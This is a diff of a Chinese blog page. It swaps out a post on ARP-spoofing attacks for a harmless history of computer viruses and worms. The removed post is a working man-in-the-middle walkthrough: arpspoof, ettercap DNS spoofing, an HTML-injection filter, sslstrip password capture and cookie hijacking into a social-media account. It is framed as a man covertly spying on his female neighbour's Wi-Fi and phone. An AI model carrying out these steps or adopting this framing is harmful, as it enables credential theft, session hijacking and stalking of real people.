@@ -15,7 +15,7 @@
     <meta name="description" content="It's raining cats and dogs.">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>来自身边的安全威胁—ARP欺骗攻击 · wang66&#39;s blog</title>
+    <title>恶意代码发展简史 · wang66&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Still Shines.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">来自身边的安全威胁—ARP欺骗攻击</a>
+                <a href="#" class="post-name">恶意代码发展简史</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            来自身边的安全威胁—ARP欺骗攻击
+            恶意代码发展简史
             <!-- 404 -->
             
         </h1>
@@ -261,22 +261,20 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "局域网">局域网</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "恶意代码">恶意代码</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "arp">arp</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "中间人攻击">中间人攻击</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "计算机病毒">计算机病毒</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">3,639</span> / Reading time: <span class="post-count">14 min</span></span>
+                        <span>Word count: <span class="post-count">4,625</span> / Reading time: <span class="post-count">16 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/25</span>
+                    <span class="post-intro-time">2018/09/10</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -400,113 +398,54 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>小黑是一个电脑技术爱好者，他每天爱做的事情就是宅在家中玩电脑。小黑的隔壁住着一个女生，刚搬来不久，小黑对她很是好奇，但是一直不敢和她搭讪，就想用自己擅长电脑技术，尽可能多的去收集信息了解她(情节需要，请勿模仿)。<a id="more"></a></p>
-<p><img src="http://www.bbvdd.com/d/201808252222304of.png" alt=""><br>小黑首先想到的就是连入她家的无线网，经过之前的了解，他已经知道了女生家中的wifi名称，然后尝试了弱口令登录，随便试了几下没想到真的通过验证了。(关于无线密码破解这部分内容将在下一篇文章中讲到，这里只讲同一个局域网环境中的攻击，所以本文省略这个步骤。)小黑很高兴，省了不少步骤，心想这个女生的安全意识真的有待提高啊。</p>
-<h2 id="了解网络环境"><a href="#了解网络环境" class="headerlink" title="了解网络环境"></a>了解网络环境</h2><p>接下来小黑要先了解下自己的网络环境，首先他查看了自己的ip地址,自己现在的ip地址是<strong>192.168.1.132</strong>(这里用的是ubuntu的Linux ，很多工具要自己装，在Kali上工具都是齐全的哦。)<br><img src="http://www.bbvdd.com/d/20180825222326end.png" alt=""><br>之后就是要看一下这个局域网中有哪些设备，那就用nmap扫一下吧。</p>
+        <p>1977年夏天，作家托马斯•捷•瑞安出版了一本名为《P-1的春天》的科幻小说，作者在书中描写了一种可以在计算机中互相传染的病毒，这种病毒最后控制了 7,000 台计算机，造成了一场灾难。这本书曾在美国一度畅销，但在当时的人们看来，都觉得书中所写的事情是几十年甚至是几百年后都不会发生的。然而就在几年后，虚拟科幻小说世界中的东西，竟然真的成为了现实中电脑使用者的噩梦。<a id="more"></a></p>
+<p>计算机技术的飞速发展给人类带来便利的同时，也有越来越多的人利用它牟取利益。恶意代码的出现，是必然的。现在的恶意代码可以分成五类：病毒、木马、蠕虫、移动代码和复合型病毒。发展到如今的恶意代码功能性更强，危害也更大。2017年5月让人记忆犹新的WannaCry勒索病毒在这一月爆发，这被认为是迄今为止最严重的勒索病毒事件，至少150个国家、30万名用户中招，造成损失达80亿美元。</p>
+<p><img src="http://www.bbvdd.com/d/20180910201924r5m.png" alt="WannaCry勒索病毒"></p>
+<p>虽然有“计算机病毒之父”弗雷德•科恩给计算机病毒正名：“计算机病毒不是利用操作系统的错误或缺陷的程序，它是正常的用户程序。”但人们总是能想尽办法找到其妙用所在。技术本无罪，有罪的是人类无尽的自私和贪婪。就像恶意代码出现时从最初的研究为主要目的，到变为炫耀个人技术的工具，再到现在的勒索盈利。这里我们简单地讲讲恶意代码的历史， 看看它是怎样发展的。</p>
+<h2 id="摇篮时代"><a href="#摇篮时代" class="headerlink" title="摇篮时代"></a>摇篮时代</h2><p>从一个故事说起：法拉第在表演他的圆盘发电机时,一位贵妇人问道：“法拉第先生,这东西有什么作用呢?”法拉第答道：“夫人,一个刚刚出生的婴儿有什么作用呢?”</p>
+<p>新发明的诞生和新技术的出现，总是很难预测它对将来会产生怎样的影响。就像一个刚出生的婴儿，我们不知道他将来会成为怎样的一个人。对于一项技术的预见性，往往也只存在于科幻小说中。恶意代码的诞生之初，也并非就是一个立刻搞破坏的“坏孩子”。最初的概念是电脑的先驱者冯•诺依曼在1949年发表的论文《复杂自动机组织论》中提出的：一种能够实现复制自身的自动机。</p>
+<p><img src="http://www.bbvdd.com/d/201809102021200il.jpeg" alt="冯·诺依曼"></p>
+<p>能够自我复制，能够自我繁殖，那岂不是等于说，这段代码拥有了生命？这个新奇的想法很快的调动了研究人员的好奇心。虽然有绝大部分电脑专家都无法想象，这种能自我繁殖的程序的存在是可能的。但在这短短十一年后，也就是1960年，一个名叫“磁芯大战”的游戏在贝尔实验室中诞生，使冯•诺依曼的设想成为事实。这项游戏是三个年轻人在工作之余所发明的，这三个年轻人分别是道格拉斯•麦耀莱、维特•维索斯基和罗伯•莫里斯，当时三人的年纪，都只有二十多岁。</p>
+<p>“磁芯大战”从名字也可以看出来就是程序之间的战争，大家都设计一个程序，再把这些程序都放到内存中，然后开始“并发”运行。在于双方的程序进入电脑之后，玩游戏的人只能看着屏幕上显示的战况，而不能做任何更改。看最终的结果是谁的程序消灭了内存中的其他程序而活了下来。这也是这个游戏的特点。每个程序都要尽力的消灭其他程序，为了能够生存,程序应该能保护自己，不断移动自身来躲过其他程序的攻击或当自身受到攻击后能自我修复。因为它们都在电脑的记忆磁芯中游走，因此得到了“磁芯大战”之名。</p>
+<p><img src="http://www.bbvdd.com/d/20180910202137xu0.jpeg" alt="磁芯大战"></p>
+<p>这一程序对抗模型可以看作是原始的病毒对抗。在摇篮时代就展现了其破坏力的一面：抢占系统内存资源，消灭其他的程序。但那时的电脑也都没有连线，是相互独立的，因此病毒代码很难传播。如果有某部电脑受到“感染”，失去控制，工作人员只需把它关掉便可。在计算机尚未普及的年代，电脑连线而成的网络还尚未成为社会结构的一部分，处在摇篮中的恶意代码，仅仅只是电脑工作者认为的一种娱乐游戏。</p>
+<h2 id="熊孩子"><a href="#熊孩子" class="headerlink" title="熊孩子"></a>熊孩子</h2><p>计算机技术和网络技术在飞速发展，当电脑连线而成的网络逐渐成为社会结构的一部分之后，电脑研究员意识到：一个能自我复制的病毒程序便很可能带来无穷的危害了。例如爬行者程序（“磁芯大战”游戏中的一种程序）就能够从一台机器“爬”到另一台机器中。因此，长久以来懂得玩“磁芯大战”游戏的电脑工作者都严守一项不成文的规定：不对大众公开这些程序的内容。但人们对它的探索从未停下脚步，也不断有人打破这些规则，使其的影响范围越来越大。</p>
+<p>第一个已知被广泛传播的计算机病毒ELK Cloner诞生于1981年，而它的作者，只是一个15岁的高中生——里奇•斯克伦塔。病毒通过软盘传播，这个病毒开始作用，并随后将它自己拷贝到任何被访问的未感染的软盘中。因为那时的计算机有两个软盘驱动器，并因为磁盘经常在朋友之间传递，这个病毒就被频繁地复制。在被感染后，计算机每被启动50次，就会显示以下文字：　</p>
 <blockquote>
-<p>nmap  -sP  192.168.1.1-254   也可以输入  nmap  -sP  192.168.1.0/24</p>
+<p>Elk Cloner: The program with a personality It will get on all your disks It will infiltrate your chips Yes it’s Cloner! It will stick to you like glue It will modify ram too Send in the Cloner!　</p>
 </blockquote>
-<p><img src="http://www.bbvdd.com/d/20180825222412yq3.png" alt=""></p>
-<blockquote>
-<p>看起来设备很多，192.168.1.1是网关，也就是女生家中的无线路由器。Dell应该就是电脑设备，其他几个设备好像都是手机。上面的信息中可以确定女生此时在家，但是这么多的设备，难道她们家来客人了？不过小黑清楚地记得，女生使用的是华为手机(也就是这次的实验的目标)。那目标的ip地址就知道了是192.168.1.106。</p>
-</blockquote>
-<p>这里先看下ARP缓存表：<br><img src="http://www.bbvdd.com/d/201808252224528tc.png" alt=""><br>刚开始ARP缓存表中没有192.168.1.106，这里ping一下之后再看ARP缓存表上就有了。<br>接下来，小黑就可以进行arp欺骗攻击了。</p>
-<hr>
-<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>&emsp;&emsp;在小黑的记忆中，这种攻击手段也叫做中间人攻击MITM(Man-in-the-Middle Attack)，算是一种古老的方法了，但仍有很多变种的中间人攻击是有效的，能够很容易地欺骗外行并且入侵他们。MITM攻击就是攻击者扮演中间人并且实施攻击。MITM攻击它可以劫持一段会话，称为会话劫持，可以窃取密码和其他机密，即使使用了SSL加密。</p>
-<p>&emsp;&emsp;这里使用的arp欺骗也被称为arp缓存中毒，是在内网的MITM攻击。Arp投毒的实现过程非常简单，我们只需要欺骗目标机器使其确信我们的攻击主机就是它的网关，再伪装成目标机器与网关欺骗网关，这样所有的流量都会通过我们的攻击主机，我们就能截获目标机器与网关的通信数据了。网络中所有的机器都包含ARP缓存，它存储了本地网络中最近时间的MAC地址与ip地址的对应关系，我们要达成攻击目标的话就需要对这个缓存进行投毒。因为地址解析协议(arp)和arp投毒还涵盖了许多其他方面的知识，所以可以先了解下arp的原理及这种攻击如何在底层的协议中发挥作用。<br><img src="http://www.bbvdd.com/d/20180825222554c0u.png" alt=""></p>
-<h2 id="进行中间人攻击"><a href="#进行中间人攻击" class="headerlink" title="进行中间人攻击"></a>进行中间人攻击</h2><p>接下来小黑就开始攻击了，先从收集女生手机上浏览的图片信息开始吧：<br><strong>第一步:</strong>启用IP转发：</p>
-<blockquote>
-<p>echo 1 &gt; / proc/sys/net/ipv4/ip_forward</p>
-</blockquote>
-<p><img src="http://www.bbvdd.com/d/20180825222633pra.png" alt=""></p>
-<p><strong>第二步：</strong>使用arpspoof执行arp欺骗，毒化被欺骗者(192.168.1.106)</p>
-<blockquote>
-<p>arpspoof  -i  eth0  -t  192.168.1.106  192.168.1.1</p>
-</blockquote>
-<p>eth0是网卡的名称，我这里的是ens33，ifconfig可以查看。<br>将被欺骗者的流量重定向给攻击者，再由攻击者转发给网关。<br><img src="http://www.bbvdd.com/d/20180825222716l22.png" alt=""><br><strong>第三步：</strong>使用arospoof执行arp欺骗，毒化网关(192.168.1.1)</p>
-<blockquote>
-<p>arpspoof -i eth0 -t  192.168.1.1  192.168.1.132</p>
-</blockquote>
-<p>使网关的数据重定向到攻击者的机器。(流量由网关到攻击者再到受攻击者)<br><img src="http://www.bbvdd.com/d/201808252228155uw.png" alt=""><br>关于第二步和第三步，可能会和具体的网络情况不同而出现偏差，请进行灵活的尝试。</p>
-<p><strong>第四步：</strong>执行drifnet，就可以捕获手机上浏览器访问的图片。</p>
-<blockquote>
-<p>driftnet -i ens33 </p>
-</blockquote>
-<p><img src="http://www.bbvdd.com/d/201808252228564ce.png" alt=""><br>不一会儿，就接收到手机上的图片啦。看来她此时在浏览有关汽车的东西。</p>
-<hr>
-<p><strong>Ps：还可以执行dsniff命令，捕获密码。</strong></p>
-<blockquote>
-<p>dsniff  -i  ens33</p>
-</blockquote>
-<p><img src="http://www.bbvdd.com/d/20180825222919bij.png" alt=""><br>此时处于监听状态，被欺骗手机上用浏览器访问ftp站点，输入用户名和密码后，攻击者主机上的dnsiff就能成功捕获。</p>
-<p>虽然能看到图片(而且不是全部的图片都能接受到)，但小黑想要的不仅仅是这些，他觉得还需要获得更多的信息。他又使用了另一个工具：<strong>Ettercap</strong>。</p>
-<hr>
-<h2 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h2><p>&emsp;&emsp;Ettercap是一个多用途的开源工具，可以用来执行嗅探、主机分析等。Ettercap可以使用GUI(图形)和CLI(命令行)模式。下面将使用Ettercap来讲几个关于中间人攻击的实例：</p>
-<blockquote>
-<p>·中间人攻击，捕获图片。<br>·DNS劫持。<br>·替换HTML代码。<br>·使用sslstrip突破ssl加密，捕获密码。<br>·对目标之间进行ARP欺骗，捕获明文密码。<br>·进行cookie劫持，登录被欺骗者的腾讯微博。</p>
-</blockquote>
-<h3 id="中间人攻击，捕获图片"><a href="#中间人攻击，捕获图片" class="headerlink" title="中间人攻击，捕获图片"></a>中间人攻击，捕获图片</h3><p>(1)执行ettercap命令，进行arp欺骗。<br>在攻击者的主机上执行如下命令</p>
-<blockquote>
-<p>ettercap  -T -M arp /(目标ip)//  /(网关ip)//  -q -i eth0 </p>
-</blockquote>
-<p>如果目标ip和网关ip不填写，则是全部监听。<br>-T: 使用文本模式启动；<br>-M: 使用中间人攻击，后面指定arp的攻击方式及两个目标;<br>-q: 安静模式(不回显)；<br>-i: 指定监听的网络接口。<br><img src="http://www.bbvdd.com/d/20180825223138a0r.png" alt=""><br>(2)执行driftnet命令，捕获图片。</p>
-<blockquote>
-<p>driftnet -i eth0</p>
-</blockquote>
-<p>在被欺骗者的手机上用浏览器访问新闻页面。此时，攻击者的主机上就会捕获到新闻页面上包含的图片。<br><img src="http://www.bbvdd.com/d/20180825223209uxw.png" alt=""></p>
-<h3 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h3><p>ettercap提供了很多有用的插件，在ettercao图形界面下(ettercap -G)，依次选择“Plugins”-&gt;“Manage the plugins”，然后双击启动插件，插件启动后，插件名前会显示”*“号。<br><img src="http://www.bbvdd.com/d/20180825223440d6v.png" alt=""><br>(1)编辑dns_spoof插件的配置文件<br>在kali linux下，ettercap的配置文件和脚本文件存放在/usr/share/ettercap/或/etc/ettercap/目录下。<br>编辑dns_spoof 插件的配置文件/etc/ettercap/etter.dns，在etter.dns文件中添加一条A记录，”*“号就是把任何域名转向192.168.1.136(本机ip)，也可以填写特定的域名，比如<a href="http://www.baidu.com。这会造成被欺骗者输入任何域名都会转向攻击者定义的ip，这里是转到攻击机的ip。" target="_blank" rel="noopener">www.baidu.com。这会造成被欺骗者输入任何域名都会转向攻击者定义的ip，这里是转到攻击机的ip。</a><br><img src="http://www.bbvdd.com/d/20180825223526av7.png" alt=""><br>(2)我们在我的的攻击机上(192.168.1.136)构建一个简单的页面<br>在/var/www/html/ 目录中编辑index.html<br><img src="http://www.bbvdd.com/d/20180825223614fik.png" alt=""><br>再启动web服务：</p>
-<blockquote>
-<p>/etc/init.d/apache2 start</p>
-</blockquote>
-<p>浏览器访问192.168.1.136，显示如下：一个简单的hello<br><img src="http://www.bbvdd.com/d/20180825223917jym.png" alt=""><br>(3)执行ettercap命令，进行DNS劫持。这次的目标是192.168.1.107，就是我的宿主机(windows)，192.168.1.1还是网关。</p>
-<blockquote>
-<p>ettercap -Tq -i eth0 -P dns_spoof -M arp:remote /192.168.1.107// //192.168.1.1/</p>
-</blockquote>
-<p><img src="http://www.bbvdd.com/d/20180825224055myc.png" alt=""><br>(4)被欺骗者(192.168.1.107)访问百度首页。<br><img src="http://www.bbvdd.com/d/20180825230007i3m.png" alt=""><br>域名已经被劫持了，有的浏览器也可能出现服务器拒绝连接。<br><img src="http://www.bbvdd.com/d/20180825230107m5b.png" alt=""></p>
-<h3 id="替换HTML代码"><a href="#替换HTML代码" class="headerlink" title="替换HTML代码"></a>替换HTML代码</h3><p>ettercap 还有很强大的过滤脚本功能，通过使用过滤脚本，可以对捕获的数据包做修改(替换网页内容、替换下载内容、在网页中插入代码等)，然后发给被欺骗主机。<br>(1)编辑文件replace.filter<br>新建一个过滤脚本文本replace.filter,内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.dst == 80)&#123;  </span><br><span class="line">    if (search(DATA.data,&quot;Accept-Encoding&quot;))&#123;  </span><br><span class="line">        replace(&quot;Accept-Encoding&quot;,&quot;Accept-Rubbish!&quot;);  </span><br><span class="line">        #note:replacement string is same length as original string  </span><br><span class="line">        msg(&quot;zapped Accept-Encoding!\n&quot;);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80)&#123;  </span><br><span class="line">    replace(&quot;&lt;head&gt;&quot;,&quot;&lt;head&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&apos;HTTP数据包内容被替换&apos;);&lt;/script&gt;&quot;);  </span><br><span class="line">    replace(&quot;&lt;HEAD&gt;&quot;,&quot;&lt;HEAD&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&apos;HTTP数据包内容被替换&apos;);&lt;/script&gt;&quot;);  </span><br><span class="line">    msg(&quot;成功替换HTTP数据包内容!\n&quot;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>注意：根据语法规则 if 和 “(” 之间一定要有空格。</strong><br>该脚本可以替换HTML代码中的<head>,在网页上弹出提示框。<br>(2)编译文件replace.filter<br>要使用这个脚本，还需要使用ettercap自带的编译工具把这个脚本编译成ettercap可以识别的二进制文件，使用如下命令编译，replace.ef就是已经编译完成的过滤脚本。</head></p>
-<blockquote>
-<p>etterfilter  eplace.filter  -o  replace.ef</p>
-</blockquote>
-<p><img src="http://www.bbvdd.com/d/20180825230425ra1.png" alt=""><br>(3)发动攻击<br>执行如下命令：</p>
-<blockquote>
-<p>ettercap  -T  -q  -i eth0 -F replace.ef -M arp:remote //192.168.1.107/  //192.168.1.1/   </p>
-</blockquote>
-<p><img src="http://www.bbvdd.com/d/20180825230534ubp.png" alt=""><br><img src="http://www.bbvdd.com/d/20180825230625oxk.png" alt=""></p>
-<p>该脚本执行成功后，被欺骗者网页会弹出提示框。</p>
-<h3 id="使用sslstrip突破ssl加密"><a href="#使用sslstrip突破ssl加密" class="headerlink" title="使用sslstrip突破ssl加密"></a>使用sslstrip突破ssl加密</h3><p>原理如下：<br>(1)攻击者先进行ARP欺骗，使得攻击者能捕获被欺骗者的网络流量。<br>(2)攻击者利用被欺骗者对浏览器地址栏中https与http忽略，将所有的https连接都替换为http连接。<br>(3)同时，攻击者与服务器建立正常的https连接。<br>(4)由于http通信是明文传输，攻击者能够轻易捕获密码。<br><strong>第一步：</strong>开启内核转发功能</p>
-<blockquote>
-<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p>
-</blockquote>
-<p>开启内核转发功能保证攻击过程中被攻击者不断网。<br><strong>第二步：</strong>执行iptables命令<br><img src="http://www.bbvdd.com/d/201808252307164k2.png" alt=""><br>把80端口的流量转发到sslstrip监听的10000端口上。</p>
-<blockquote>
-<p>iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 10000</p>
-</blockquote>
-<p><strong>第三步：</strong>启动sslstrip</p>
-<blockquote>
-<p>sslstrip -l  10000</p>
-</blockquote>
-<p><img src="http://www.bbvdd.com/d/20180825230750qgx.png" alt=""></p>
-<p><strong>第四步：</strong>新开一个终端，执行ettercap命令，进行arp欺骗</p>
-<blockquote>
-<p>ettercap  -T  -q  -M   arp:remote  //192.168.1.107/  //192.168.1.1/</p>
-</blockquote>
-<p><strong>第五步：</strong>捕获密码<br>被欺骗者登录163邮箱时，https被降为http，此时ettercap捕获就能捕获到密码。<br>但是现在的浏览器都能察觉异常，足够引起用户的怀疑了。<br><img src="http://www.bbvdd.com/d/20180825230824n0t.png" alt=""></p>
-<h3 id="对目标之间进行ARP欺骗"><a href="#对目标之间进行ARP欺骗" class="headerlink" title="对目标之间进行ARP欺骗"></a>对目标之间进行ARP欺骗</h3><p><strong>第一步：</strong>启动ettercap<br>打开终端，输入 ettercap –G<br>依次选择“sniff”-&gt;“unified sniffing”根据自己的要求选择抓包的网络接口。<br><img src="http://www.bbvdd.com/d/20180825230906590.png" alt=""><br><strong>第二步：</strong>扫描主机<br>选择“Hosts”-&gt;“Scan for hosts”<br>扫描完成后选择“Scan for hosts”，然后选择“Hosts list”查看扫描到的主机列表<br><img src="http://www.bbvdd.com/d/20180825230931jxl.png" alt=""><br><strong>第三步：</strong>选择攻击目标<br>选择192.168.0.107，单机“Add to Target 1”，然后选择192.168.1.1，单机“Add to Target 2”<br><img src="http://www.bbvdd.com/d/2018082523100632w.png" alt=""><br><strong>第四步：</strong>明确攻击方式<br>依次选择“Mitm”-&gt;“ARP poisoning”-&gt;“Sniff remote connections”-&gt;“确定”。<br>告诉被欺骗者A(192.168.1.107)攻击者(192.168.1.136)是网关(192.168.1.1)，使得被欺骗者A把所有数据流量全部发送给攻击者，然后抓包捕获密码。ettercap可以自动完成这些步骤，只要选好目标主机即可。<br>在被欺骗者(192.168.1.107)的终端模拟器中执行arp命令，这时可以看arp地址表，网关(192.168.1.1)MAC是攻击机的，arp毒化成功。<br><img src="http://www.bbvdd.com/d/20180825231045khv.png" alt=""><br><strong>第五步：</strong>开始监听<br>依次选择“Start”-&gt;“Start sniffing”开始监听。<br><strong>第六步：</strong>被欺骗者用浏览器访问<a href="http://rpmfusion.org/，输入用户名密码" target="_blank" rel="noopener">http://rpmfusion.org/，输入用户名密码</a><br><strong>第七步：</strong>攻击者主机，ettercap成功捕获了用户名和密码<br><img src="http://www.bbvdd.com/d/20180825231107js1.png" alt=""></p>
-<h3 id="进行cookie劫持登录被欺骗者的腾讯微博。"><a href="#进行cookie劫持登录被欺骗者的腾讯微博。" class="headerlink" title="进行cookie劫持登录被欺骗者的腾讯微博。"></a>进行cookie劫持登录被欺骗者的腾讯微博。</h3><p>使用ettercap抓取被欺骗者的cookie从而实现cookie劫持，并登陆被欺骗者的腾讯微博。<br><strong>第一步：</strong>构建工具<br>使用Firefox浏览器、Scripish或GreaseMonkey、Original Cookie Injector，构建一个可以在网页中嵌入Cookie的工具。<br>(1)先安装GreaseMonkey或者Scripish，然后重启浏览器。<br><strong>Scripish下载地址：</strong><a href="https://addons.mozilla.org/zh-CN/firefox/addon/scriptish/" target="_blank" rel="noopener">https://addons.mozilla.org/zh-CN/firefox/addon/scriptish/</a><br><strong>GreaseMonkey下载地址：</strong><a href="https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/</a><br>(2)再安装Original Cookie Injector，然后重启浏览器。<br><strong>Original Cookie Injector地址：</strong><a href="http://userscripts-mirror.org/scripts/show/119798,单击右上角的“Install”安装。" target="_blank" rel="noopener">http://userscripts-mirror.org/scripts/show/119798,单击右上角的“Install”安装。</a><br><strong>第二步：</strong>扫描主机<br>在ettercap图形界面，依次选择“Hosts”-&gt;“Scan for hosts”，扫描完成后再选择“Hosts list”，查看扫描到的主机列表。<br><strong>第三步：</strong>选择攻击目标<br>选择192.168.0.107，单机“Add to Target 1”，然后选择192.168.1.1，单机“Add to Target 2”<br><strong>第四步：</strong>明确攻击方式<br>依次选择“Mitm”-&gt;“ARP poisoning”-&gt;“Sniff remote connections”-&gt;“确定”。<br>告诉被欺骗者A(192.168.1.107)攻击者(192.168.1.136)是网关(192.168.1.1)，使得被欺骗者A把所有数据流量全部发送给攻击者，然后抓包捕获密码。ettercap可以自动完成这些步骤，只要选好目标主机即可。<br><strong>第五步：</strong>开始监听<br>依次选择“Start”-&gt;“Start sniffing”开始监听。<br><strong>第六步：</strong>在被欺骗着的主机上用浏览器访问腾讯微博<a href="http://t.qq.com，输入用户名和密码" target="_blank" rel="noopener">http://t.qq.com，输入用户名和密码</a><br><strong>第七步：</strong>查看被欺骗者的网链接<br>“View”-&gt;”connections”，查看被欺骗者的网络链接。<br><img src="http://www.bbvdd.com/d/20180825231155du8.png" alt=""><br><strong>第八步：</strong>查看捕获数据包的详细信息，获得cookie<br>双击某个链接，查看捕获数据包的详细信息。把cookie：后面的字段复制下来。<br><img src="http://www.bbvdd.com/d/2018082523122105i.png" alt=""><br><strong>第九步：</strong>登陆腾讯微博<br>在攻击者主机，访问微博登录页面，按”ALT+C”，弹出对话框，把cookie值粘贴进去，单击ok然后f5刷新页面，就能登录了。</p>
-<p>&emsp;&emsp;以上几个实验在现在的浏览器上不一定能取得良好的效果了，但是新的变种攻击还是层出不穷，作为最接近身边的安全威胁(攻击者也可能远程操控局域网中的一台电脑)，我们再一定程度上还是需要警惕的。</p>
-<hr>
-<h2 id="arp欺骗攻击的防范"><a href="#arp欺骗攻击的防范" class="headerlink" title="arp欺骗攻击的防范"></a>arp欺骗攻击的防范</h2><p>那么我们在现实生活中怎么防止受到这类攻击呢？<br>(1)在客户端使用arp命令绑定网关的IP/MAC(如arp -s 192.68.1.1 00-e0-eb-81-81-85)<br>(2)在交换机上做端口域MAC地址的静态绑定。<br>(3)在路由器上做IP/MAC地址的静态绑定。<br>(4)使用arp服务器定时广播网段内所有主机的正确IP/MAC映射表。<br>(5)及时升级客户端的操作系统和应用程序补丁。<br>(6)升级杀毒软件及病毒库。</p>
-<hr>
+<p><img src="http://www.bbvdd.com/d/20180910202200y4g.jpeg" alt=""></p>
+<p>Elk Cloner并没有什么破坏性，而是设计来作为一个善意的玩笑。简单的讲只是一个具有传播特性的恶作剧代码。</p>
+<p>1983年，当年一项杰出电脑奖得奖人肯•汤普逊，在颁奖典礼上作了一个演讲，他在演讲中打破了电脑工作者严守的规定，不但公开证实了电脑病毒的存在，而且还告诉所有听众怎样去写自己的病毒程序。他的同行全都吓坏了，但为时已晚，这个秘密已经流传出去了。</p>
+<p>1983年11月3日，真正具有破坏性的计算机病毒诞生。当时还是南加州大学一名学生的弗雷德•科恩在UNIX系统下，编写了一个能够自动复制并在计算机间进行传染繁殖从而引起系统死机的程序，通过存储介质软盘传到了电脑上。虽然此前就已经知道电脑病毒可能存在的事实，但科恩却是第一个将其付诸实践的人。</p>
+<p><img src="http://www.bbvdd.com/d/20180910202217cx5.jpeg" alt="弗雷德•科恩"></p>
+<p>1984年，情况愈复杂了，这一年，《科学美国人》月刊的专栏作家杜特尼在5月刊号写了第一篇讨论“磁芯大战”的文章，并且只要寄上两块美金，任何读者都可以收到有关写程序的纲领，在自己家的电脑中开辟战场。<br>1985年3月份的《科学美国人》里，杜特尼再次讨论“磁芯大战”和病毒。在文章的开头他便说：“当去年5月有关‘磁芯大战’的文章印出来时，我并没有想过我所谈论的是那么严重的题目……”文中第一次提到“病毒”这个名称。他提到说，意大利的电脑程序员利用感染磁碟的方式使其它电脑受到破坏性程序的感染。</p>
+<p>就这样，许多程序员都了解了病毒的原理，进而开始尝试编制这种具有隐蔽性、攻击性和传染性的特殊程序。病毒从隐秘走向公开，先是利用磁碟，然后是利用网络，迅速在全世界范围内扩散开来，成为电脑用户的头号敌人。</p>
+<p>1986年初，在巴基斯坦的拉合尔（Lahore），巴锡特（Basit）和阿姆杰德（Amjad）两兄弟经营着一家IBM-PC机及其兼容机的小商店。他们编写了Pakistan病毒，即Brain。在一年内流传到了世界各地。当时，由于当地盗版软件猖獗，为了防止软件被任意非法拷贝，也为了追踪到底有多少人在非法使用他们的软件，于是在1986年年初，他们编写了”大脑（Brain）”病毒，又被称为”巴基斯坦”病毒。该病毒运行在DOS操作系统下，通过软盘传播，只在盗拷软件时才发作，发作时将盗拷者的硬盘剩余空间吃掉。</p>
+<p>1988年3月2日，一种苹果机的病毒发作，这天受感染的苹果机停止工作，只显示”向所有苹果电脑的使用者宣布和平的信息”。以庆祝苹果机生日。</p>
+<p>1988年冬天，发明“磁芯大战”的三个年轻人之一的罗伯•莫里斯的儿子，正在康奈尔大学攻读研究生的罗伯特•莫里斯，把一个被称为“蠕虫”的电脑病毒送进了美国最大的电脑网络——互联网。</p>
+<p><img src="http://www.bbvdd.com/d/20180910202239yj8.jpeg" alt="罗伯特•莫里斯"></p>
+<p>1988年11月2日下午5点，互联网的管理人员首次发现网络有不明入侵者。它们仿佛是网络中的超级间谍，狡猾地不断截取用户口令等网络中的“机密文件”，利用这些口令欺骗网络中的“哨兵”，长驱直入互联网中的用户电脑。入侵得手，立即反客为主，并闪电般地自我复制，抢占地盘。</p>
+<p>用户目瞪口呆地看着这些不请自来的神秘入侵者迅速扩大战果，充斥电脑内存，使电脑莫名其妙地“死掉”，只好急如星火地向管理人员求援，哪知，他们此时四面楚歌，也只能眼睁睁地看着网络中电脑一批又一批地被病毒感染而“身亡”。当晚，从美国东海岸到西海岸，互联网用户陷入一片恐慌。当加州伯克利分校的专家找出阻止病毒蔓延的办法时，短短12小时内，已有6200台采用Unix操作系统的SUN工作站和VAX小型机瘫痪或半瘫痪，不计其数的数据和资料毁于这一夜之间。造成一场损失近亿美元的空前大劫难！莫里斯事件震惊了美国社会乃至整个世界。</p>
+<p>而比事件影响更大、更深远的是：更多的人从中受到启发，恶意代码从单纯的“熊孩子式”的破坏，往牟取利益的方向发展。黑客伦理失去约束，黑客传统开始中断。大众对黑客的印象也不再回复。</p>
+<p>潘多拉之盒被打开了。</p>
